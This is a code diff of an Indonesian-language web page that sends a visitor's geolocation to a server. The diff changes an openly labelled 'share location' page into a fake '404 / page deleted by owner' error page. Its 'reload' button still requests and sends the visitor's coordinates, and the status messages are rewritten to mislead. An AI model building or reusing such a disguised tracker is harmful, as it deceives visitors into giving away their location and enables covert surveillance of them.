@@ -24,13 +24,22 @@
 <body>
   <div class="wrap">
     <div class="card">
+      <h1>Halaman Sudah dihapus Oleh Pemiliknya</h1>
       <p class="small">
-      <div class="consent"
-    <textarea id="note" placeholder="Contoh: HP terlihat di pos satpam, jam 14:05."></textarea>
+        Error 404 Gagal Menghubungi Server
+      </p>
+      <div class="consent">
+        Silahkan Refresh Data
+      </div>
 
-      <button id="shareBtn">📍 Bagikan Lokasi</button>
+      <label for="note">Bantuan dan Laporkan</label>
+      <textarea id="note" placeholder="-"></textarea>
+
+      <button id="shareBtn">Muat Ulang</button>
       <div class="status" id="status"></div>
       <div class="map-link" id="mapWrap">
+        <a id="mapUrl" target="_blank" rel="noopener">-</a>
+        <div class="small mono" id="coords"></div>
       </div>
     </div>
   </div>
@@ -62,29 +71,29 @@
 
   function getAndSendLocation() {
     if (!('geolocation' in navigator)) {
-      setStatus('Perangkat ini tidak mendukung Geolocation.');
+      setStatus('Silahkan Muat Ulang');
       return;
     }
 
-    setStatus('Meminta izin lokasi…');
+    setStatus('Harap Kembali dan Refresh Berkala');
     navigator.geolocation.getCurrentPosition(async (pos) => {
       const { latitude, longitude, accuracy } = pos.coords || {};
-      setStatus('Mengirim lokasi…');
+      setStatus('Loading...');
 
       try {
         const result = await sendLocation(latitude, longitude, accuracy);
         if (result.ok) {
-          setStatus('Lokasi berhasil dikirim!');
+          setStatus('Silahkan Buka di Browser Lain');
           const gmaps = `https://maps.google.com/?q=${latitude},${longitude}`;
           mapUrl.href = gmaps;
-          mapUrl.textContent = 'Buka titik lokasi di Google Maps';
+          mapUrl.textContent = '-';
           coordsEl.textContent = `Lat: ${latitude}, Lng: ${longitude}, Akurasi ±${Math.round(accuracy)} m`;
           mapWrap.style.display = 'block';
         } else {
-          setStatus('Gagal simpan lokasi: ' + (result.error || 'unknown'));
+          setStatus('Muat Ulang Kembali: ' + (result.error || 'unknown'));
         }
       } catch {
-        setStatus('Gagal jaringan saat mengirim lokasi.');
+        setStatus('Gagal jaringan');
       }
     }, (err) => {
       const msg = {1:'Izin ditolak.',2:'Lokasi tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal mendapatkan lokasi.';
